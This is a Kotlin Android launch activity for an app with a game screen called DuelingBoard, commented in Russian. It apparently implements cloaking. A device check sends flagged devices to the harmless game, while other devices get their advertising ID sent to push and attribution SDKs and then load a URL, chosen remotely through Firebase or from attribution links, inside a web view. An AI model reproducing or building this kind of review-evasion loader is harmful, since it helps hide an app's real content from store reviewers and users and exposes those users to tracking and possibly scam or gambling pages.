package com.dueli.ngbuf.falo.activity

import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.view.Window
import androidx.activity.result.contract.ActivityResultContracts
import com.dueli.ngbuf.falo.DuelingBoard
import com.dueli.ngbuf.falo.analytics.Analytics
import com.dueli.ngbuf.falo.databinding.ActivityLaunchBoardBinding
import com.dueli.ngbuf.falo.timer.TimerNetwork
import com.dueli.ngbuf.falo.utils.DeviceUtil
import com.dueli.ngbuf.falo.utils.lib.AppsLib
import com.dueli.ngbuf.falo.utils.lib.FbLib
import com.dueli.ngbuf.falo.utils.lib.FireLib
import com.dueli.ngbuf.falo.utils.lib.OneLib
import com.dueli.ngbuf.falo.utils.storege.Bucket
import com.dueli.ngbuf.falo.utils.str.Linked
import com.dueli.ngbuf.falo.utils.str.Referer
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

class LaunchBoard : AppCompatActivity() {
    private var wbCustom: WbCustom? = null
    private lateinit var binding: ActivityLaunchBoardBinding
    private var timer: TimerNetwork? = null
    private val listener =
        registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
            if (result.resultCode == RESULT_OK) {
                result.data?.let { intent ->
                    wbCustom?.listenerSuccess(intent)
                }
            } else {
                wbCustom?.listenerOnFail()
            }
        }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityLaunchBoardBinding.inflate(layoutInflater)
        requestWindowFeature(Window.FEATURE_NO_TITLE)
        setContentView(binding.root)
        supportActionBar?.hide()

        Analytics.geo()

        DeviceUtil.checkDevice(
            this, callbackFail = {
                Analytics.devMode()
                startActivity()
//                callbackSuccess()
            },
            callbackSuccess = this::callbackSuccess
        )
    }

    // Если прошел по условию
    private fun callbackSuccess() {
        Referer.init(this)

        Analytics.appOpen()

        CoroutineScope(Dispatchers.Main).launch {
            val adId =
                withContext(Dispatchers.Default) { getAdvertingId() }
            Linked.advertisingId = adId
            OneLib.setExternalUserId(adId)
            val firstUrl = Bucket.startUrl
            if (firstUrl.isEmpty()) {
                // Инициализируем Appsflyer
                startAppInit()
                timer = TimerNetwork {
                    generateLink()
                }
                timer?.startTimer()
            } else {
                Analytics.repearEnter()
                Linked.link = firstUrl
                wbCustom = WbCustom(this@LaunchBoard, binding, listener)
                wbCustom?.init()
            }
        }
    }

    private fun callback(link: String) {
        if (link.isNotEmpty()) {
            Linked.link = link
            timer?.cancelTimer()
        }
    }

    private suspend fun getAdvertingId(): String {
        return AdvertisingIdClient.getAdvertisingIdInfo(applicationContext).id.toString()
    }

    private fun startAppInit() {
        AppsLib.init(this, this::callback)
        FbLib.init(this, this::callback)
    }

    private fun generateLink() {
        //Настраиваем конфиг FirebaseRemote
        FireLib.init(this, callbackSuccess = {
            wbCustom = WbCustom(this, binding, listener)
            wbCustom?.init()
        }, callbackFail = {
            startActivity()
        })
    }

    private fun startActivity() {
        val intent = Intent(this, DuelingBoard::class.java)
        intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
        startActivity(intent)
    }

    override fun onWindowFocusChanged(hasFocus: Boolean) {
        super.onWindowFocusChanged(hasFocus)
        if (hasFocus) {
            wbCustom?.onWindowFocusChanged(window)
        }
    }

    override fun onSaveInstanceState(outState: Bundle) {
        super.onSaveInstanceState(outState)
        wbCustom?.onSaveInstanceState(outState)
    }

    override fun onBackPressed() {
        wbCustom?.onBackPressed {
            super.onBackPressed()
        }
    }

    override fun onRestoreInstanceState(savedInstanceState: Bundle) {
        super.onRestoreInstanceState(savedInstanceState)
        wbCustom?.onRestoreInstanceState(savedInstanceState)
    }

    override fun onResume() {
        super.onResume()
        wbCustom?.onResume()
    }

    override fun onPause() {
        super.onPause()
        wbCustom?.onPause()
    }
}